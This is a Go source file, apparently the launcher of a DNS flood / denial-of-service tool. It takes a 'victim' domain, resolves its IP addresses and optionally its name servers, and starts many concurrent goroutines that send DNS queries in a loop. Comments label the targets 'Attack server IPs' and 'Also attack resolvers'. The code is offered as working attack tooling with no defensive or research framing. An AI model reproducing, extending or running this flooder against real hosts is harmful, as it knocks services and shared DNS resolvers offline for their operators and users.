package internal

import (
	"fmt"
	"net"
	"os"
	"os/signal"
	"strconv"
	"sync"
	"syscall"
	"time"
)

type Settings struct {
	// Valiables from flags
	NRoutines    *int
	NQuestions   *int
	VictimDomain *string
	SleepTime    *time.Duration
	Deep         *bool
	// Calculated variables
	IPAddresses []net.IP // all known IP adresses of victim
	NameServers []net.IP // all known name servers that resolve victim. only for deep mode
	Port        uint16
}

type Launcher struct {
	settings *Settings
	stop     chan struct{}
	wg       sync.WaitGroup
}

func NewLauncher(settings *Settings) Launcher {
	return Launcher{
		settings: settings,
		stop:     make(chan struct{}),
	}
}

func (l *Launcher) Initialize() {
	// Split host and port
	host, port, err := net.SplitHostPort(*l.settings.VictimDomain)
	if err != nil {
		host = *l.settings.VictimDomain
	}
	l.parseHost(host)
	l.parsePort(port)
}

func (l *Launcher) parseHost(host string) {
	var err error
	if len(host) == 0 {
		fmt.Fprintf(os.Stderr, "host is not specified\n")
		os.Exit(1)
	}
	ipAddress := net.ParseIP(host)
	if ipAddress != nil {
		l.settings.IPAddresses = append(l.settings.IPAddresses, ipAddress)
		return
	}
	l.settings.IPAddresses, err = net.LookupIP(host)
	if err != nil {
		fmt.Fprintf(os.Stderr, "could not get IPs: %v\n", err)
		os.Exit(1)
	}
	l.initializeNameServers()
}

func (l *Launcher) parsePort(port string) {
	if len(port) == 0 {
		l.settings.Port = DNSPort
		return
	}
	parsedPort, err := strconv.ParseUint(port, 10, 16)
	if err != nil {
		fmt.Fprintf(os.Stderr, "could not parse port: %v\n", err)
		os.Exit(1)
	}
	l.settings.Port = uint16(parsedPort)
}

func (l *Launcher) initializeNameServers() {
	nameServers, err := net.LookupNS(*l.settings.VictimDomain)
	if err != nil {
		fmt.Fprintf(os.Stderr, "could not get name servers: %v\n", err)
		os.Exit(1)
	}
	for _, ns := range nameServers {
		ip, err := net.LookupIP(ns.Host)
		if err != nil {
			fmt.Fprintf(os.Stderr, "could not get IP of name server: %v\n", err)
		}
		l.settings.NameServers = append(l.settings.NameServers, ip...)
	}
}

func (l *Launcher) Start() {
	// Attack server IPs
	for _, ipAddress := range l.settings.IPAddresses {
		for i := 0; i < *l.settings.NRoutines; i++ {
			l.wg.Add(1)
			go l.runner(ipAddress)
		}
	}
	// Also attack resolvers
	for _, nsAddress := range l.settings.NameServers {
		for i := 0; i < *l.settings.NRoutines; i++ {
			l.wg.Add(1)
			go l.runner(nsAddress)
		}
	}
}

func (l *Launcher) runner(addr net.IP) {
	client := NewDNSClient(net.JoinHostPort(addr.String(), strconv.Itoa(int(l.settings.Port))), l.settings)
	senderFunc := client.GetSenderFunc()
	for {
		senderFunc()
		time.Sleep(*l.settings.SleepTime)
		select {
		case _, ok := <-l.stop:
			if !ok {
				l.wg.Done()
				return
			}
		default:
		}
	}
}

func (l *Launcher) AwaitShutdown() {
	sigChan := make(chan os.Signal, 1)
	signal.Notify(
		sigChan,
		syscall.SIGHUP,
		syscall.SIGINT,
		syscall.SIGTERM,
		syscall.SIGQUIT,
	)
	<-sigChan
}

func (l *Launcher) Stop() {
	close(l.stop)
	l.wg.Wait()
}
